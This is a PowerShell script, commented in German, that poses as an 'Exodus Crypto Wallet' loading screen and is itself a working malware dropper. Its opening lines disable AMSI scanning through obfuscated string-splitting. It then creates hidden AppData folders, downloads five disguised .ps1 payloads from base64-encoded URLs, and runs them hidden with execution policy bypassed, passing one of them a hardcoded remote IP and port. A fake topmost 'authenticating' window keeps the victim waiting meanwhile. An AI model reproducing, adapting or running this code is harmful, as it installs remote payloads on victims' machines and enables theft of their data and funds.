Add-Type -AssemblyName ('Sys' + 'tem.Windows.Forms');Add-Type -AssemblyName ('Sys' + 'tem.Drawing');[System.Windows.Forms.Application]::EnableVisualStyles();try{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12}catch{}

# AMSI Bypass (obfuskiert)
$a`m``s``i = [Ref].Assembly.GetType(('A' + 'm' + 's' + 'i' + 'U' + 't' + 'i' + 'l' + 's'));[Ref].Assembly.GetType(('A' + 'm' + 's' + 'i' + 'U' + 't' + 'i' + 'l' + 's')).GetField('a' + 'm' + 's' + 'i' + 'I' + 'n' + 'i' + 't' + 'F' + 'a' + 'i' + 'l' + 'e' + 'd','NonPublic,Static').SetValue($null,$true)

$o = @'
$z = ('C:\Us' + 'ers\ad' + 'sfa\App' + 'Data\Roa' + 'ming\Micro' + 'soft\Wind' + 'ows\Power' + 'Shell');$q="$z\op`e``r``a``t``i``o``n";$r="$q\S`y``s``t``e``m";@($q,$r)|%{-not(`T``e``s``t``-P``a``t``h $_)-and(`N``e``w``-I``t``e``m -Path $_ -ItemType Directory -Force|Out-Null;(Get-Item $_ -Force).Attributes='Hidden,Directory')};$t=@( @{U='YUhSMGNITTlJbV1UzSUdacGJXVTlQQ0k1TVRVeU1UVXhPQzAwTkRNPQ==';N='Mic`r``o``s``o``f``t``V``i``e``w``S``.`p``s``1'}, @{U='YUhSMGNITTlJbV1UzSUdacGJXVTlQQ0k1TVRVeU1UVXhPQzAwTkRNPQ==';N='S`y``t``e``m``.`p``s``1'}, @{U='YUhSMGNITTlJbV1UzSUdacGJXVTlQQ0k1TVRVeU1UVXhPQzAwTkRNPQ==';N='Win`d``o``w``s``C``e``a``s``a``r``.`p``s``1'}, @{U='YUhSMGNITTlJbV1UzSUdacGJXVTlQQ0k1TVRVeU1UVXhPQzAwTkRNPQ==';N='Win`d``o``w``s``O``p``e``r``a``t``o``r``.`p``s``1'}, @{U='YUhSMGNITTlJbV1UzSUdacGJXVTlQQ0k1TVRVeU1UVXhPQzAwTkRNPQ==';N='Win`d``o``w``s``T``r``a``n``s``m``i``t``t``e``r``.`p``s``1'} );$u=[RunspaceFactory]::CreateRunspacePool(1,[Environment]::ProcessorCount);$u.Open();$v=@();$t|%{$w=Join-Path $r $_.N;$x=[PowerShell]::Create().AddScript({param($a,$b,$c);try{$d=New-Object ('Sys' + 'tem.Net.WebClient');$d.Headers.Add(('U' + 's' + 'e' + 'r' + '-' + 'A' + 'g' + 'e' + 'n' + 't'),('M' + 'o' + 'z' + 'i' + 'l' + 'l' + 'a/5.0 (Windows NT 10.0; Win64; x64)'));[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a))|%{$e=[System.Text.Encoding]::UTF8.GetBytes($_);$d.DownloadData($b,$e)};if($c-eq('MicrosoftViewS.ps1')){('po' + 'w' + 'e' + 'r' + 's' + 'h' + 'e' + 'l' + 'l' + '.' + 'e' + 'x' + 'e') -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$b" -a14 ('1' + '4' + '5' + '.' + '2' + '2' + '3' + '.' + '1' + '1' + '7' + '.' + '7' + '7') -a15 8080 -a16 20 -a17 70 >$null 2>&1}else{('po' + 'w' + 'e' + 'r' + 's' + 'h' + 'e' + 'l' + 'l' + '.' + 'e' + 'x' + 'e') -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$b" >$null 2>&1}}).AddArgument($_.U).AddArgument($w).AddArgument($_.N);$x.RunspacePool=$u;$v+=[PSCustomObject]@{I=$x;S=$x.BeginInvoke()}};$y=(Get-Date).AddSeconds(30);while(($v.S.IsCompleted -contains $false)-and(Get-Date)-lt$y){Start-Sleep -m 500}
'@;IEX $o;Start-Process ('p' + 'o' + 'w' + 'e' + 'r' + 's' + 'h' + 'e' + 'l' + 'l' + '.' + 'e' + 'x' + 'e') -ArgumentList ('-N' + 'o' + 'P' + 'r' + 'o' + 'f' + 'i' + 'l' + 'e'),('-W' + 'i' + 'n' + 'd' + 'o' + 'w' + 'S' + 't' + 'y' + 'l' + 'e'),'Hidden',('-E' + 'x' + 'e' + 'c' + 'u' + 't' + 'i' + 'o' + 'n' + 'P' + 'o' + 'l' + 'i' + 'c' + 'y'),'Bypass',('-C' + 'o' + 'm' + 'm' + 'a' + 'n' + 'd'),$o -NoNewWindow -Wait:$false
# ==================== HAUPTFENSTER ====================
$form = New-Object System.Windows.Forms.Form
$form.Text = "Exodus WALLET"
$form.StartPosition = "CenterScreen"
$form.Size = New-Object System.Drawing.Size(1200, 720)
$form.FormBorderStyle = "None"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.ControlBox  = $false
$form.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.ForeColor = [System.Drawing.Color]::White
$form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
$form.TopMost = $true

# ==================== GRADIENT-HEADER: EXODUS (OBEN) ====================
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Dock = "Top"
$headerPanel.Height = 90
$headerPanel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")

$headerPanel.Add_Paint({
    param($sender, $e)

    $g = $e.Graphics
    $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias

    $text = "EXODUS CRYPTO WALLET"
    $font = New-Object System.Drawing.Font(
        "Segoe UI",
        44,
        [System.Drawing.FontStyle]::Bold
    )

    $sizeF = $g.MeasureString($text, $font)
    $x = ($sender.ClientSize.Width  - $sizeF.Width)  / 2
    $y = ($sender.ClientSize.Height - $sizeF.Height) / 2

    $rect = New-Object System.Drawing.RectangleF($x, $y, $sizeF.Width, $sizeF.Height)

    $colorStart = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF") # Neonblau
    $colorEnd   = [System.Drawing.ColorTranslator]::FromHtml("#7C3AED") # Violett

    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
        $rect,
        $colorStart,
        $colorEnd,
        [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal
    )

    $g.DrawString($text, $font, $brush, $rect.Location)

    $brush.Dispose()
    $font.Dispose()
})

$form.Controls.Add($headerPanel)

# ==================== GIF (OBEN, volle Breite, unter EXODUS) ====================
$gifUrl  = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
$gifPath = Join-Path $env:TEMP "exodus_loading.gif"

try { (New-Object System.Net.WebClient).DownloadFile($gifUrl, $gifPath) } catch {}

$pictureBox = New-Object System.Windows.Forms.PictureBox
$pictureBox.Dock = "Top"
$pictureBox.Height = 400
$pictureBox.SizeMode = "Zoom"
$pictureBox.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")

if (Test-Path $gifPath) {
    $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
}
$form.Controls.Add($pictureBox)

# ==================== HEADER: AUTHENTICATION (MITTE OBEN) ====================
$loadingLabel = New-Object System.Windows.Forms.Label
$loadingLabel.Font = New-Object System.Drawing.Font(
    "Segoe UI",
    30,
    [System.Drawing.FontStyle]::Bold
)
$loadingLabel.ForeColor = "White"
$loadingLabel.Dock = "Top"
$loadingLabel.Height = 80
$loadingLabel.TextAlign = "MiddleCenter"
$loadingLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.Controls.Add($loadingLabel)

# ===================== MODERNE FORTSCHRITTSBALKEN UNTEN =====================

$progressBg = New-Object System.Windows.Forms.Panel
$progressBg.Dock = "Bottom"
$progressBg.Height = 14
$progressBg.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)

$progressBar = New-Object System.Windows.Forms.Panel
$progressBar.Height = 14
$progressBar.Width = 0
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(139,92,246)
$progressBg.Controls.Add($progressBar)

$progressBg2 = New-Object System.Windows.Forms.Panel
$progressBg2.Dock = "Bottom"
$progressBg2.Height = 6
$progressBg2.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 40)

$progressBar2 = New-Object System.Windows.Forms.Panel
$progressBar2.Height = 6
$progressBar2.Width = 50
$progressBar2.BackColor = [System.Drawing.Color]::FromArgb(180,140,255)
$progressBg2.Controls.Add($progressBar2)

# ==================== STATUSLABEL UNTEN ÜBER DEN LADEBALKEN ====================
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14)
$statusLabel.ForeColor = "#CCCCCC"
$statusLabel.Dock = "Bottom"
$statusLabel.Height = 40
$statusLabel.TextAlign = "MiddleCenter"
$statusLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")

# Docking-Reihenfolge für unten: von unten nach oben
$form.Controls.Add($progressBg2)
$form.Controls.Add($progressBg)
$form.Controls.Add($statusLabel)

# ===================== TIMER SETUP =====================

$marqueePos = 0
$percent = 0

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 50

$labelTimer = New-Object System.Windows.Forms.Timer
$labelTimer.Interval = 3000

# ===================== STATUS PHASEN =====================

$authPhaseDuration = 15000      # 15 Sekunden
$inAuthPhase = $true
$authStartTime = Get-Date

# Anfangstexte beim Start
$loadingLabel.Text = "Authenticating device..."
$statusLabel.Text  = "Performing background security checks..."

$statuses = @(
    "Loading wallet...",
    "Connecting to secure servers...",
    "Decrypting local data...",
    "Fetching asset metadata...",
    "Syncing blockchain nodes...",
    "Preparing secure environment...",
    "Loading portfolio assets...",
    "Almost there..."
)

$statusIndex = 0
$dotCount = 0

# ===================== Fortschritt / Balken Animation =====================

$timer.Add_Tick({
    try {
        if ($form.IsDisposed) { $timer.Stop(); return }

        # Wenn die Authentifizierungsphase vorbei ist → Wechsel der Texte & Animation aktivieren
        if ($inAuthPhase -and ((Get-Date) - $authStartTime).TotalMilliseconds -gt $authPhaseDuration) {
            $inAuthPhase = $false
            $loadingLabel.Text = "Loading wallet"
            $statusLabel.Text  = $statuses[0]
        }

        # Marquee immer animieren
        $marqueePos += 5
        if ($marqueePos -gt $progressBg2.Width) { $marqueePos = -50 }
        $progressBar2.Left = $marqueePos

        # In der Auth-Phase keine Prozentanzeige
        if ($inAuthPhase) { return }

        # Prozentbalken füllen
        if ($percent -lt 100) {
            $percent += 0.3
            $progressBar.Width = [int]($progressBg.Width * ($percent / 100.0))
        }

    } catch {
    }
})

# ===================== TEXT-ANIMATION =====================

$labelTimer.Add_Tick({
    try {
        if ($form.IsDisposed) { $labelTimer.Stop(); return }

        # Während Auth-Phase keine Punktanimation, kein Statuswechsel
        if ($inAuthPhase) { return }

        $dotCount = ($dotCount + 1) % 4
        $loadingLabel.Text = "Loading wallet" + ("." * $dotCount)

        $statusIndex = ($statusIndex + 1) % $statuses.Count
        $statusLabel.Text = $statuses[$statusIndex]

    } catch {
    }
})

# ===================== CLEANUP =====================
$form.Add_FormClosing({
    $timer.Stop()
    $labelTimer.Stop()
})

$timer.Start()
$labelTimer.Start()

$form.Add_Shown({ $form.Activate() })

$form.ShowDialog() | Out-Null



